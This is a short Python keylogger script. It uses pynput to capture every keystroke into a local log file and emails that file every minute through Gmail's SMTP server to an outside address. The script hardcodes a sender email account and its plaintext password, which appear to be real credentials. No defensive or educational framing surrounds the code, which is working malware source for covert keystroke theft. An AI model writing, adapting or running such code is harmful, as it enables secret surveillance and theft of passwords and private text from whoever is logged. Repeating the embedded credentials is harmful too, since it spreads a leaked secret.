from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os
import time
from PIL import ImageGrab

# Email configuration
EMAIL_ADDRESS = '2022it0261@svce.ac.in' # email and password we want to recieve keylogger data
EMAIL_PASSWORD = '11042005@amg#'
TO_EMAIL = 'arulkrishnan1104@gmail.com' # keylogger data wii be sent to this email
LOG_FILE = 'C:/Users/91938/Desktop/keyfile.txt'

def send_email(subject, body, attachment=None):
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = TO_EMAIL
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    if attachment:
        with open(attachment, 'rb') as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(attachment)}')
            msg.attach(part)

    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ADDRESS, TO_EMAIL, msg.as_string())

def keypress(key):
    print(str(key))
    with open(LOG_FILE, 'a') as log:
        try:
            char = key.char
            log.write(char + " ")
        except:
            print("Error in getting char")


def periodic_tasks():
    while True:
        time.sleep(60)  # Run every 60 seconds
        send_email('Keylogger Log', 'Attached is the latest keylogger log.', LOG_FILE)
        

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keypress)
    listener.start()

    periodic_tasks()
    input()
